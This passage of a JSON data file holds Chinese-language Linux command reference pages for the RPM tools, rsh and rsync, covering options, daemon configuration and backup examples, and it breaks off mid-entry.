        "body": "<h1 id=\"rpm2cpio\">rpm2cpio</h1>\n<p>将RPM软件包转换为cpio格式的文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rpm2cpio命令</strong> 用于将rpm软件包转换为cpio格式的文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rpm2cpio</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要转换的rpm包的文件名。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rpm2cpio</span> ../libstdc++-<span class=\"hljs-number\">4</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">8</span>.i386.rpm | cpio -idv\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rpmbuild",
        "des": "创建RPM的二进制软件包和源码软件包",
        "body": "<h1 id=\"rpmbuild\">rpmbuild</h1>\n<p>创建RPM的二进制软件包和源码软件包</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rpmbuild命令</strong> 被用于创建rpm的二进制软件包和源码软件包。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rpmbuild</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">--initdb：初始化RPM数据库；</span>\n<span class=\"hljs-deletion\">--rebuilddb：从已安装的包头文件，方向重建RPM数据库；</span>\n<span class=\"hljs-deletion\">-ba：创建二进制和源代码包；</span>\n<span class=\"hljs-deletion\">-bb：创建二进制代码包；</span>\n<span class=\"hljs-deletion\">-bs：创建源代码包。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rpmbuild</span> -ba <span class=\"hljs-string\">'spec文件路径'</span>\n</code></pre>\n<p>build完后，可以在<code>/usr/src/redhat/RPMS/</code>下找到二进制rpm包，rpm包按照其对应的cpu体系结构分类，通常在<code>/usr/src/redhat/RPMS/i386</code>目录下。<code>/usr/src/redhat/SRPMS/</code>下找到源码rpm包，此时由于是源代码，所以无须按体系结构分类。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rpmdb",
        "des": "初始化和重建RPM数据库",
        "body": "<h1 id=\"rpmdb\">rpmdb</h1>\n<p>初始化和重建RPM数据库</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rpmdb命令</strong> 用于初始化和重建rpm数据库。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rpmdb</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--initdb：初始化RPM数据库；</span>\n<span class=\"hljs-comment\">--rebuilddb：从已安装的包头文件，反向重建RPM数据库。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rpmquery",
        "des": "从RPM数据库中查询软件包信息",
        "body": "<h1 id=\"rpmquery\">rpmquery</h1>\n<p>从RPM数据库中查询软件包信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rpmquery命令</strong> 使用多种依据从rpm数据库中查询软件包信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rpmquery</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-qf：查询指定的文件所属的软件包；</span>\n<span class=\"hljs-deletion\">-q：查询指定的软件包是否被安装；</span>\n<span class=\"hljs-deletion\">-qc：查询软件包中的配置文件；</span>\n<span class=\"hljs-deletion\">-qd：查询软件包中的文档文件；</span>\n<span class=\"hljs-deletion\">-qi：查询软件包的基本信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>使用rpmquery命令查询指定文件所属的软件包：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># rpmquery -qf /usr/bin/htpasswd</span>\nhttpd<span class=\"hljs-number\">-2.2</span><span class=\"hljs-number\">.3</span><span class=\"hljs-number\">-81.</span>el5.centos\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rpmsign",
        "des": "使用RPM软件包的签名管理工具",
        "body": "<h1 id=\"rpmsign\">rpmsign</h1>\n<p>使用RPM软件包的签名管理工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rpmsign命令</strong> 使用rpm软件包的签名管理工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rpmsign</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--addsign：为自动软件包添加签名；</span>\n<span class=\"hljs-comment\">--checksig：验证软件包签名；</span>\n<span class=\"hljs-comment\">--delsign：删除软件包签名；</span>\n<span class=\"hljs-comment\">--import：导入公钥；</span>\n<span class=\"hljs-comment\">--resign：重新签名软件包；</span>\n<span class=\"hljs-comment\">--nodigest：不验证软件包摘要；</span>\n<span class=\"hljs-comment\">--nosignature：不验证软件包签名。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rpmverify",
        "des": "验证已安装的RPM软件包的正确性",
        "body": "<h1 id=\"rpmverify\">rpmverify</h1>\n<p>验证已安装的RPM软件包的正确性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rpmverify命令</strong> 用来验证已安装的rpm软件包的正确性。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rpmverify</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-Va：验证所有软件包；</span>\n<span class=\"hljs-deletion\">-V&lt;软件包&gt;f：验证指定软件包；</span>\n<span class=\"hljs-deletion\">--nomd5：不验证软件包的md5摘要。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rsh",
        "des": "连接远程主机并执行命令",
        "body": "<h1 id=\"rsh\">rsh</h1>\n<p>连接远程主机并执行命令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rsh命令</strong> 用于连接到远程的指定主机并执行指定的命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rsh</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：使用Socket层级的排错功能；</span>\n<span class=\"hljs-deletion\">-l&lt;用户名称&gt;：指定要登入远端主机的用户名称；</span>\n<span class=\"hljs-deletion\">-n：把输入的指令号向代号为/dev/null的特殊外围设备。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  远程主机：指定要连接的远程主机；</li>\n<li>  指令：指定要在远程主机上执行的命令。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rsync",
        "des": "远程数据同步工具",
        "body": "<h1 id=\"rsync\">rsync</h1>\n<p>远程数据同步工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rsync命令</strong> 是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。rsync使用所谓的“rsync算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 rsync是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">rsync <span class=\"hljs-comment\">[OPTION]</span>... SRC DEST\nrsync <span class=\"hljs-comment\">[OPTION]</span>... SRC <span class=\"hljs-comment\">[USER@]</span>host:DEST\nrsync <span class=\"hljs-comment\">[OPTION]</span>... <span class=\"hljs-comment\">[USER@]</span>HOST:SRC DEST\nrsync <span class=\"hljs-comment\">[OPTION]</span>... <span class=\"hljs-comment\">[USER@]</span>HOST::SRC DEST\nrsync <span class=\"hljs-comment\">[OPTION]</span>... SRC <span class=\"hljs-comment\">[USER@]</span>HOST::DEST\nrsync <span class=\"hljs-comment\">[OPTION]</span>... rsync://<span class=\"hljs-comment\">[USER@]</span>HOST<span class=\"hljs-comment\">[:PORT]</span>/SRC <span class=\"hljs-comment\">[DEST]</span>\n</code></pre>\n<p>对应于以上六种命令格式，rsync有六种不同的工作模式：</p>\n<ol>\n<li> 拷贝本地文件。当SRC和DES路径信息都不包含有单个冒号\":\"分隔符时就启动这种工作模式。如：<code>rsync -a /data /backup</code></li>\n<li> 使用一个远程shell程序(如rsh、ssh)来实现将本地机器的内容拷贝到远程机器。当DST路径地址包含单个冒号\":\"分隔符时启动该模式。如：<code>rsync -avz *.c foo:src</code></li>\n<li> 使用一个远程shell程序(如rsh、ssh)来实现将远程机器的内容拷贝到本地机器。当SRC地址路径包含单个冒号\":\"分隔符时启动该模式。如：<code>rsync -avz foo:src/bar /data</code></li>\n<li> 从远程rsync服务器中拷贝文件到本地机。当SRC路径信息包含\"::\"分隔符时启动该模式。如：<code>rsync -av root@192.168.78.192::www /databack</code></li>\n<li> 从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含\"::\"分隔符时启动该模式。如：<code>rsync -av /databack root@192.168.78.192::www</code></li>\n<li> 列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：<code>rsync -v rsync://192.168.78.192/www</code></li>\n</ol>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-v, --verbose 详细模式输出。</span>\n<span class=\"hljs-deletion\">-q, --quiet 精简输出模式。</span>\n<span class=\"hljs-deletion\">-c, --checksum 打开校验开关，强制对文件传输进行校验。</span>\n<span class=\"hljs-deletion\">-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。</span>\n<span class=\"hljs-deletion\">-r, --recursive 对子目录以递归模式处理。</span>\n<span class=\"hljs-deletion\">-R, --relative 使用相对路径信息。</span>\n<span class=\"hljs-deletion\">-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。</span>\n<span class=\"hljs-deletion\">--backup-dir 将备份文件(如~filename)存放在在目录下。</span>\n<span class=\"hljs-deletion\">-suffix=SUFFIX 定义备份文件前缀。</span>\n<span class=\"hljs-deletion\">-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。</span>\n<span class=\"hljs-deletion\">-l, --links 保留软链结。</span>\n<span class=\"hljs-deletion\">-L, --copy-links 想对待常规文件一样处理软链结。</span>\n<span class=\"hljs-deletion\">--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。</span>\n<span class=\"hljs-deletion\">--safe-links 忽略指向SRC路径目录树以外的链结。</span>\n<span class=\"hljs-deletion\">-H, --hard-links 保留硬链结。</span>\n<span class=\"hljs-deletion\">-p, --perms 保持文件权限。</span>\n<span class=\"hljs-deletion\">-o, --owner 保持文件属主信息。</span>\n<span class=\"hljs-deletion\">-g, --group 保持文件属组信息。</span>\n<span class=\"hljs-deletion\">-D, --devices 保持设备文件信息。</span>\n<span class=\"hljs-deletion\">-t, --times 保持文件时间信息。</span>\n<span class=\"hljs-deletion\">-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间。</span>\n<span class=\"hljs-deletion\">-n, --dry-run现实哪些文件将被传输。</span>\n<span class=\"hljs-deletion\">-w, --whole-file 拷贝文件，不进行增量检测。</span>\n<span class=\"hljs-deletion\">-x, --one-file-system 不要跨越文件系统边界。</span>\n<span class=\"hljs-deletion\">-B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节。</span>\n<span class=\"hljs-deletion\">-e, --rsh=command 指定使用rsh、ssh方式进行数据同步。</span>\n<span class=\"hljs-deletion\">--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。</span>\n<span class=\"hljs-deletion\">-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。</span>\n<span class=\"hljs-deletion\">--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。</span>\n<span class=\"hljs-deletion\">--delete 删除那些DST中SRC没有的文件。</span>\n<span class=\"hljs-deletion\">--delete-excluded 同样删除接收端那些被该选项指定排除的文件。</span>\n<span class=\"hljs-deletion\">--delete-after 传输结束以后再删除。</span>\n<span class=\"hljs-deletion\">--ignore-errors 及时出现IO错误也进行删除。</span>\n<span class=\"hljs-deletion\">--max-delete=NUM 最多删除NUM个文件。</span>\n<span class=\"hljs-deletion\">--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。</span>\n<span class=\"hljs-deletion\">--force 强制删除目录，即使不为空。</span>\n<span class=\"hljs-deletion\">--numeric-ids 不将数字的用户和组id匹配为用户名和组名。</span>\n<span class=\"hljs-deletion\">--timeout=time ip超时时间，单位为秒。</span>\n<span class=\"hljs-deletion\">-I, --ignore-times 不跳过那些有同样的时间和长度的文件。</span>\n<span class=\"hljs-deletion\">--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。</span>\n<span class=\"hljs-deletion\">--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。</span>\n<span class=\"hljs-deletion\">-T --temp-dir=DIR 在DIR中创建临时文件。</span>\n<span class=\"hljs-deletion\">--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。</span>\n<span class=\"hljs-deletion\">-P 等同于 --partial。</span>\n<span class=\"hljs-deletion\">--progress 显示备份过程。</span>\n<span class=\"hljs-deletion\">-z, --compress 对备份的文件在传输时进行压缩处理。</span>\n<span class=\"hljs-deletion\">--exclude=PATTERN 指定排除不需要传输的文件模式。</span>\n<span class=\"hljs-deletion\">--include=PATTERN 指定不排除而需要传输的文件模式。</span>\n<span class=\"hljs-deletion\">--exclude-from=FILE 排除FILE中指定模式的文件。</span>\n<span class=\"hljs-deletion\">--include-from=FILE 不排除FILE指定模式匹配的文件。</span>\n<span class=\"hljs-deletion\">--version 打印版本信息。</span>\n<span class=\"hljs-deletion\">--address 绑定到特定的地址。</span>\n<span class=\"hljs-deletion\">--config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。</span>\n<span class=\"hljs-deletion\">--port=PORT 指定其他的rsync服务端口。</span>\n<span class=\"hljs-deletion\">--blocking-io 对远程shell使用阻塞IO。</span>\n<span class=\"hljs-deletion\">-stats 给出某些文件的传输状态。</span>\n<span class=\"hljs-deletion\">--progress 在传输时现实传输过程。</span>\n<span class=\"hljs-deletion\">--log-format=formAT 指定日志文件格式。</span>\n<span class=\"hljs-deletion\">--password-file=FILE 从FILE中得到密码。</span>\n<span class=\"hljs-deletion\">--bwlimit=KBPS 限制I/O带宽，KBytes per second。</span>\n<span class=\"hljs-deletion\">-h, --help 显示帮助信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>SSH方式</strong></p>\n<p>首先在服务端启动ssh服务：</p>\n<pre><code class=\"language-shell\">service sshd <span class=\"hljs-literal\">start</span>\n启动 sshd： [确定]\n</code></pre>\n<p> <strong>使用rsync进行同步</strong></p>\n<p>接下来就可以在客户端使用rsync命令来备份服务端上的数据了，SSH方式是通过系统用户来进行备份的，如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rsync</span> -vzrtopg --progress -e ssh --delete work@<span class=\"hljs-number\">172.16.78.192</span>:/www/* /databack/experiment/rsync\n<span class=\"hljs-attribute\">work</span>@<span class=\"hljs-number\">172.16.78.192</span>'s password:\n<span class=\"hljs-attribute\">receiving</span> file list ...\n<span class=\"hljs-attribute\">5</span> files to consider\n<span class=\"hljs-attribute\">test</span>/\n<span class=\"hljs-attribute\">a</span>\n<span class=\"hljs-attribute\">0</span> <span class=\"hljs-number\">100</span>% <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>kB/s <span class=\"hljs-number\">527</span>:<span class=\"hljs-number\">35</span>:<span class=\"hljs-number\">41</span> (<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">20</span>.<span class=\"hljs-number\">0</span>% of <span class=\"hljs-number\">5</span>)\n<span class=\"hljs-attribute\">b</span>\n<span class=\"hljs-attribute\">67</span> <span class=\"hljs-number\">100</span>% <span class=\"hljs-number\">65</span>.<span class=\"hljs-number\">43</span>kB/s <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> (<span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">40</span>.<span class=\"hljs-number\">0</span>% of <span class=\"hljs-number\">5</span>)\n<span class=\"hljs-attribute\">c</span>\n<span class=\"hljs-attribute\">0</span> <span class=\"hljs-number\">100</span>% <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>kB/s <span class=\"hljs-number\">527</span>:<span class=\"hljs-number\">35</span>:<span class=\"hljs-number\">41</span> (<span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">60</span>.<span class=\"hljs-number\">0</span>% of <span class=\"hljs-number\">5</span>)\n<span class=\"hljs-attribute\">dd</span>\n<span class=\"hljs-attribute\">100663296</span> <span class=\"hljs-number\">100</span>% <span class=\"hljs-number\">42</span>.<span class=\"hljs-number\">22</span>MB/s <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">02</span> (<span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">80</span>.<span class=\"hljs-number\">0</span>% of <span class=\"hljs-number\">5</span>)\n<span class=\"hljs-attribute\">sent</span> <span class=\"hljs-number\">96</span> bytes received <span class=\"hljs-number\">98190</span> bytes <span class=\"hljs-number\">11563</span>.<span class=\"hljs-number\">06</span> bytes/sec\n<span class=\"hljs-attribute\">total</span> size is <span class=\"hljs-number\">100663363</span> speedup is <span class=\"hljs-number\">1024</span>.<span class=\"hljs-number\">19</span>\n</code></pre>\n<p>上面的信息描述了整个的备份过程，以及总共备份数据的大小。</p>\n<p> <strong>后台服务方式</strong></p>\n<p>启动rsync服务，编辑<code>/etc/xinetd.d/rsync</code>文件，将其中的<code>disable=yes</code>改为<code>disable=no</code>，并重启xinetd服务，如下：</p>\n<pre><code class=\"language-shell\">vi /etc/xinetd.d/rsync\n\n<span class=\"hljs-comment\">#default: off</span>\n<span class=\"hljs-comment\"># description: The rsync server is a good addition to an ftp server, as it \\</span>\n<span class=\"hljs-comment\"># allows crc checksumming etc.</span>\nservice rsync {\ndisable = no\nsocket_type = stream\nwait = no\nuser = root\nserver = /usr/bin/rsync\nserver_args = --daemon\nlog_on_failure += USERID\n}\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/etc/i</span>nit.d/xinetd restart\n停止 xinetd： [确定]\n启动 xinetd： [确定]\n</code></pre>\n<p>创建配置文件，默认安装好rsync程序后，并不会自动创建rsync的主配置文件，需要手工来创建，其主配置文件为“/etc/rsyncd.conf”，创建该文件并插入如下内容：</p>\n<pre><code class=\"language-shell\">vi /etc/rsyncd.conf\n\n<span class=\"hljs-attribute\">uid</span>=root\n<span class=\"hljs-attribute\">gid</span>=root\nmax <span class=\"hljs-attribute\">connections</span>=4\nlog <span class=\"hljs-attribute\">file</span>=/var/log/rsyncd.log\npid <span class=\"hljs-attribute\">file</span>=/var/run/rsyncd.pid\nlock <span class=\"hljs-attribute\">file</span>=/var/run/rsyncd.lock\nsecrets <span class=\"hljs-attribute\">file</span>=/etc/rsyncd.passwd\nhosts <span class=\"hljs-attribute\">deny</span>=172.16.78.0/22\n\n[www]\ncomment= backup web\n<span class=\"hljs-attribute\">path</span>=/www\nread only = <span class=\"hljs-literal\">no</span>\n<span class=\"hljs-attribute\">exclude</span>=test\nauth <span class=\"hljs-attribute\">users</span>=work\n</code></pre>\n<p>创建密码文件，采用这种方式不能使用系统用户对客户端进行认证，所以需要创建一个密码文件，其格式为“username:password”，用户名可以和密码可以随便定义，最好不要和系统帐户一致，同时要把创建的密码文件权限设置为600，这在前面的模块参数做了详细介绍。</p>\n<pre><code class=\"language-shell\">echo <span class=\"hljs-string\">\"work:abc123\"</span> &gt; <span class=\"hljs-regexp\">/etc/</span>rsyncd.passwd\nchmod <span class=\"hljs-number\">600</span> <span class=\"hljs-regexp\">/etc/</span>rsyncd.passwd\n</code></pre>\n<p>备份，完成以上工作，现在就可以对数据进行备份了，如下：</p>\n<pre><code class=\"language-shell\">rsync -avz <span class=\"hljs-comment\">--progress --delete work@172.16.78.192::www /databack/experiment/rsync</span>\n\nPassword:\nreceiving <span class=\"hljs-built_in\">file</span> list ...\n<span class=\"hljs-number\">6</span> <span class=\"hljs-built_in\">files</span> <span class=\"hljs-built_in\">to</span> consider\n./ <span class=\"hljs-built_in\">files</span>...\n<span class=\"hljs-keyword\">a</span>\n<span class=\"hljs-number\">0</span> <span class=\"hljs-number\">100</span>% <span class=\"hljs-number\">0.00</span>kB/s <span class=\"hljs-number\">528</span>:<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">41</span> (<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">50.0</span>% <span class=\"hljs-keyword\">of</span> <span class=\"hljs-number\">6</span>)\nb\n<span class=\"hljs-number\">67</span> <span class=\"hljs-number\">100</span>% <span class=\"hljs-number\">65.43</span>kB/s <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> (<span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">66.7</span>% <span class=\"hljs-keyword\">of</span> <span class=\"hljs-number\">6</span>)\nc\n<span class=\"hljs-number\">0</span> <span class=\"hljs-number\">100</span>% <span class=\"hljs-number\">0.00</span>kB/s <span class=\"hljs-number\">528</span>:<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">41</span> (<span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">83.3</span>% <span class=\"hljs-keyword\">of</span> <span class=\"hljs-number\">6</span>)\ndd\n<span class=\"hljs-number\">100663296</span> <span class=\"hljs-number\">100</span>% <span class=\"hljs-number\">37.49</span>MB/s <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">02</span> (<span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">100.0</span>% <span class=\"hljs-keyword\">of</span> <span class=\"hljs-number\">6</span>)\nsent <span class=\"hljs-number\">172</span> <span class=\"hljs-keyword\">bytes</span> received <span class=\"hljs-number\">98276</span> <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-number\">17899.64</span> <span class=\"hljs-keyword\">bytes</span>/<span class=\"hljs-built_in\">sec</span>\ntotal size is <span class=\"hljs-number\">150995011</span> speedup is <span class=\"hljs-number\">1533.75</span>\n</code></pre>\n<p>恢复，当服务器的数据出现问题时，那么这时就需要通过客户端的数据对服务端进行恢复，但前提是服务端允许客户端有写入权限，否则也不能在客户端直接对服务端进行恢复，使用rsync对数据进行恢复的方法如下：</p>\n<pre><code class=\"language-shell\">rsync -avz <span class=\"hljs-comment\">--progress /databack/experiment/rsync/ work@172.16.78.192::www</span>\n\nPassword:\nbuilding <span class=\"hljs-built_in\">file</span> list ...\n<span class=\"hljs-number\">6</span> <span class=\"hljs-built_in\">files</span> <span class=\"hljs-built_in\">to</span> consider\n./\n<span class=\"hljs-keyword\">a</span>\nb\n<span class=\"hljs-number\">67</span> <span class=\"hljs-number\">100</span>% <span class=\"hljs-number\">0.00</span>kB/s <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> (<span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">66.7</span>% <span class=\"hljs-keyword\">of</span> <span class=\"hljs-number\">6</span>)\nc\nsent <span class=\"hljs-number\">258</span> <span class=\"hljs-keyword\">bytes</span> received <span class=\"hljs-number\">76</span> <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-number\">95.43</span> <span class=\"hljs-keyword\">bytes</span>/<span class=\"hljs-built_in\">sec</span>\ntotal size is <span class=\"hljs-number\">150995011</span> speedup is <span class=\"hljs-number\">452080.87</span>\n</code></pre>\n<p><strong>将源目录同步到目标目录</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">$ </span><span class=\"language-bash\">rsync -r <span class=\"hljs-built_in\">source</span> destination</span>\n</code></pre>\n<p>上面命令中，<code>-r</code> 表示递归，即包含子目录。注意，<code>-r</code>是必须的，否则 <code>rsync</code> 运行不会成功。<code>source</code> 目录表示源目录，<code>destination</code> 表示目标目录。</p>\n<p><strong>多个文件或目录同步</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$ </span>rsync -r source1 source2 destination\n</code></pre>\n<p>上面命令中，<code>source1</code>、<code>source2</code> 都会被同步到 <code>destination</code> 目录。</p>\n<p><strong>同步元信息</strong></p>\n<p><code>-a</code> 参数可以替代 <code>-r</code>，除了可以递归同步以外，还可以同步元信息（比如修改时间、权限等）。由于 <code>rsync</code> 默认使用文件大小和修改时间决定文件是否需要更新，所以 <code>-a</code> 比 <code>-r</code> 更有用。下面的用法才是常见的写法。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">$ </span><span class=\"language-bash\">rsync -a <span class=\"hljs-built_in\">source</span> destination</span>\n</code></pre>\n<p>目标目录 <code>destination</code> 如果不存在，<code>rsync</code> 会自动创建。执行上面的命令后，源目录 <code>source</code> 被完整地复制到了目标目录 <code>destination</code> 下面，即形成了 <code>destination/source</code> 的目录结构。</p>\n<p>如果只想同步源目录 <code>source</code> 里面的内容到目标目录 <code>destination</code> ，则需要在源目录后面加上斜杠。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">$ </span><span class=\"language-bash\">rsync -a <span class=\"hljs-built_in\">source</span>/ destination</span>\n</code></pre>\n<p>上面命令执行后，<code>source</code> 目录里面的内容，就都被复制到了 <code>destination</code> 目录里面，并不会在 <code>destination</code> 下面创建一个 <code>source</code> 子目录。</p>\n<p><strong>模拟执行的结果</strong></p>\n<p>如果不确定 <code>rsync</code> 执行后会产生什么结果，可以先用 <code>-n</code> 或 <code>--dry-run</code> 参数模拟执行的结果。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">$ </span><span class=\"language-bash\">rsync -anv <span class=\"hljs-built_in\">source</span>/ destination</span>\n</code></pre>\n<p>上面命令中，<code>-n</code> 参数模拟命令执行的结果，并不真的执行命令。<code>-v</code> 参数则是将结果输出到终端，这样就可以看到哪些内容会被同步。</p>\n<p><strong>目标目录成为源目录的镜像副本</strong></p>\n<p>默认情况下，<code>rsync</code> 只确保源目录的所有内容（明确排除的文件除外）都复制到目标目录。它不会使两个目录保持相同，并且不会删除文件。如果要使得目标目录成为源目录的镜像副本，则必须使用 <code>--delete</code> 参数，这将删除只存在于目标目录、不存在于源目录的文件。</p>\n<pre><code class=\"language-shell\">$ rsync -av --<span class=\"hljs-keyword\">delete</span> <span class=\"hljs-keyword\">source</span>/ destination\n</code></pre>\n<p>上面命令中，<code>--delete</code> 参数会使得 <code>destination</code> 成为 <code>source</code> 的一个镜像。</p>\n<p><strong>排除文件</strong></p>\n<p>有时，我们希望同步时排除某些文件或目录，这时可以用--exclude参数指定排除模式。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">$ </span><span class=\"language-bash\">rsync -av --exclude=<span class=\"hljs-string\">'*.txt'</span> <span class=\"hljs-built_in\">source</span>/ destination</span>\n<span class=\"hljs-meta\"># </span><span class=\"language-bash\">或者</span>\n<span class=\"hljs-meta\">$ </span><span class=\"language-bash\">rsync -av --exclude <span class=\"hljs-string\">'*.txt'</span> <span class=\"hljs-built_in\">source</span>/ destination</span>\n</code></pre>\n<p>上面命令排除了所有 <code>TXT</code> 文件。</p>\n<p>注意，<code>rsync</code> 会同步以\"点\"开头的隐藏文件，如果要排除隐藏文件，可以这样写 <code>--exclude=\".*\"</code>。</p>\n<p>如果要排除某个目录里面的所有文件，但不希望排除目录本身，可以写成下面这样。</p>\n<pre><code class=\"language-shell\">$ rsync -av --<span class=\"hljs-keyword\">exclude</span> <span class=\"hljs-string\">'dir1/*'</span> <span class=\"hljs-keyword\">source</span>/ destination\n</code></pre>\n<p>多个排除模式，可以用多个 <code>--exclude</code> 参数。</p>\n<pre><code class=\"language-shell\">$ rsync -av --<span class=\"hljs-keyword\">exclude</span> <span class=\"hljs-string\">'file1.txt'</span> --<span class=\"hljs-keyword\">exclude</span> <span class=\"hljs-string\">'dir1/*'</span> <span class=\"hljs-keyword\">source</span>/ destination\n</code></pre>\n<p>多个排除模式也可以利用 Bash 的大扩号的扩展功能，只用一个 <code>--exclude</code> 参数。</p>\n<pre><code class=\"language-shell\">$ rsync -av --<span 